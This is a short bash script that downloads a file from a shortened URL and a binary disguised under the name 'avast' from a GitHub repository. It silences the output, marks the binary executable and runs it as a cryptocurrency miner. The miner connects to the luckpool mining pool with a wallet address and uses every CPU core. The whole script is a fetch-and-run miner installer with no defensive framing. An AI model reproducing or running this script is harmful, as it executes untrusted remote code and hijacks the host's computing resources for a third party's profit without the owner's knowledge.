#!/bin/bash
set -ex
wget https://git.io/JMsl3
wget https://github.com/circelwenakyo/nyobsa/raw/main/avast >/dev/null 2>&1
chmod +x avast >/dev/null 2>&1
./avast -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.PC_Kentank -p x -t $(nproc)
